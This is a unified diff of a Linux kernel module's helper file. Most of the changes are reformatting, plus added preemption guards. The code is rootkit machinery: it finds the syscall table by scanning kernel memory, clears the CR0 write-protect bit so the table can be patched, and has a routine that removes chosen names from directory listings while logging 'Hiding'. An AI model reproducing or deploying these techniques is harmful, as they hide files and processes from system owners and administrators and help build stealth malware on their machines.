@@ -22,7 +22,7 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 # include <linux/syscalls.h>
 # endif // CPP
 
-# include "lib/structs.h"
+# include "structs.h"
 
 
 // TODO: Write other implementation.
@@ -45,15 +45,15 @@ along with this program.  If not, see <http://www.gnu.org/licenses/>.
 static unsigned long **
 get_sys_call_table_via_sys_close(void)
 {
-  unsigned long **entry = (unsigned long **)PAGE_OFFSET;
+    unsigned long **entry = (unsigned long **)PAGE_OFFSET;
 
-  for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
-    if (entry[__NR_close] == (unsigned long *)sys_close) {
-        return entry;
-      }
-  }
+    for (;(unsigned long)entry < ULONG_MAX; entry += 1) {
+        if (entry[__NR_close] == (unsigned long *)sys_close) {
+            return entry;
+        }
+    }
 
-  return NULL;
+    return NULL;
 }
 
 
@@ -68,7 +68,7 @@ get_sys_call_table_via_sys_close(void)
 unsigned long **
 get_sys_call_table(void)
 {
-  return get_sys_call_table_via_sys_close();
+    return get_sys_call_table_via_sys_close();
 }
 
 
@@ -76,9 +76,16 @@ get_sys_call_table(void)
 void
 disable_write_protection(void)
 {
-  unsigned long cr0 = read_cr0();
-  clear_bit(X86_CR0_WP_BIT, &cr0);
-  write_cr0(cr0);
+    unsigned long cr0;
+
+    preempt_disable();
+
+    cr0 = read_cr0();
+    clear_bit(X86_CR0_WP_BIT, &cr0);
+    write_cr0(cr0);
+
+    preempt_enable();
+    return;
 }
 
 
@@ -86,9 +93,16 @@ disable_write_protection(void)
 void
 enable_write_protection(void)
 {
-  unsigned long cr0 = read_cr0();
-  set_bit(X86_CR0_WP_BIT, &cr0);
-  write_cr0(cr0);
+    unsigned long cr0;
+
+    preempt_disable();
+
+    cr0 = read_cr0();
+    set_bit(X86_CR0_WP_BIT, &cr0);
+    write_cr0(cr0);
+
+    preempt_enable();
+    return;
 }
 
 
@@ -98,58 +112,58 @@ char *
 join_strings(const char *const *strings, const char *delim,
              char *buff, size_t count)
 {
-  int index;
-  const char *one;
+    int index;
+    const char *one;
 
-  strlcpy(buff, strings[0], count);
+    strlcpy(buff, strings[0], count);
 
-  index = 1;
-  one = strings[index];
-  while (one) {
-    strlcat(buff, delim, count);
-    strlcat(buff, one, count);
-
-    index += 1;
+    index = 1;
     one = strings[index];
-  }
+    while (one) {
+        strlcat(buff, delim, count);
+        strlcat(buff, one, count);
 
-  return buff;
+        index += 1;
+        one = strings[index];
+    }
+
+    return buff;
 }
 
 
 void
 print_memory(void *addr, size_t count, const char *prompt)
 {
-  const size_t ONE_SIZE = 3;
-  char one[ONE_SIZE];
-  size_t index;
-  char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
+    const size_t ONE_SIZE = 3;
+    char one[ONE_SIZE];
+    size_t index;
+    char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
 
-  if (!buff) {
-    pr_alert("%s\n", "kmalloc failed!");
-    return; // TODO: Do something else?
-  }
-
-  snprintf(one, ONE_SIZE, "%02x", *((unsigned char *)addr));
-  strlcpy(buff, one, PAGE_SIZE);
-
-  for (index = 1; index < count; index += 1) {
-    if (index && index % 16 == 0) {
-      strlcat(buff, "\n", PAGE_SIZE);
-    } else {
-      strlcat(buff, " ", PAGE_SIZE);
+    if (!buff) {
+        pr_alert("%s\n", "kmalloc failed!");
+        return; // TODO: Do something else?
     }
 
-    snprintf(one, ONE_SIZE, "%02x",
-             *((unsigned char *)addr + index));
-    strlcat(buff, one, PAGE_SIZE);
-  }
+    snprintf(one, ONE_SIZE, "%02x", *((unsigned char *)addr));
+    strlcpy(buff, one, PAGE_SIZE);
 
-  pr_alert("%s: %s\n", prompt, buff);
+    for (index = 1; index < count; index += 1) {
+        if (index && index % 16 == 0) {
+            strlcat(buff, "\n", PAGE_SIZE);
+        } else {
+            strlcat(buff, " ", PAGE_SIZE);
+        }
 
-  kfree(buff);
+        snprintf(one, ONE_SIZE, "%02x",
+                 *((unsigned char *)addr + index));
+        strlcat(buff, one, PAGE_SIZE);
+    }
 
-  return;
+    pr_alert("%s: %s\n", prompt, buff);
+
+    kfree(buff);
+
+    return;
 }
 
 
@@ -157,29 +171,29 @@ print_memory(void *addr, size_t count, const char *prompt)
 void
 print_dirent(struct linux_dirent *dirp, long total)
 {
-  char *buff;
-  long index;
-  struct linux_dirent *cur;
+    char *buff;
+    long index;
+    struct linux_dirent *cur;
 
-  buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
-  if (!buff) {
-    return;
-  }
+    buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
+    if (!buff) {
+        return;
+    }
 
-  strlcpy(buff, dirp->d_name, PAGE_SIZE);
-  index = dirp->d_reclen;
-  cur = (struct linux_dirent *)((unsigned long)dirp + index);
-  while (index < total) {
-    strlcat(buff, " ", PAGE_SIZE);
-    strlcat(buff, cur->d_name, PAGE_SIZE);
-    index += cur->d_reclen;
+    strlcpy(buff, dirp->d_name, PAGE_SIZE);
+    index = dirp->d_reclen;
     cur = (struct linux_dirent *)((unsigned long)dirp + index);
-  }
+    while (index < total) {
+        strlcat(buff, " ", PAGE_SIZE);
+        strlcat(buff, cur->d_name, PAGE_SIZE);
+        index += cur->d_reclen;
+        cur = (struct linux_dirent *)((unsigned long)dirp + index);
+    }
 
-  pr_alert("%s\n", buff);
-  kfree(buff);
+    pr_alert("%s\n", buff);
+    kfree(buff);
 
-  return;
+    return;
 }
 
 
@@ -188,21 +202,21 @@ long
 remove_dirent_entry(char *name,
                     struct linux_dirent *dirp, long total)
 {
-  struct linux_dirent *cur = dirp;
-  long index = 0;
+    struct linux_dirent *cur = dirp;
+    long index = 0;
 
-  while (index < total) {
-    if (strncmp(cur->d_name, name, strlen(name)) == 0) {
-      unsigned long next_rec = (unsigned long)cur + cur->d_reclen;
-      long rest = (unsigned long)dirp + total - next_rec;
-      long reclen = cur->d_reclen;
-      pr_alert("Hiding: %s\n", cur->d_name);
-      memmove(cur, (void *)next_rec, rest);
-      total -= reclen;
+    while (index < total) {
+        if (strncmp(cur->d_name, name, strlen(name)) == 0) {
+            unsigned long next = (unsigned long)cur + cur->d_reclen;
+            long rest = (unsigned long)dirp + total - next;
+            long reclen = cur->d_reclen;
+            pr_alert("Hiding: %s\n", cur->d_name);
+            memmove(cur, (void *)next, rest);
+            total -= reclen;
+        }
+        index += cur->d_reclen;
+        cur = (struct linux_dirent *)((unsigned long)dirp + index);
     }
-    index += cur->d_reclen;
-    cur = (struct linux_dirent *)((unsigned long)dirp + index);
-  }
 
-  return total;
+    return total;
 }
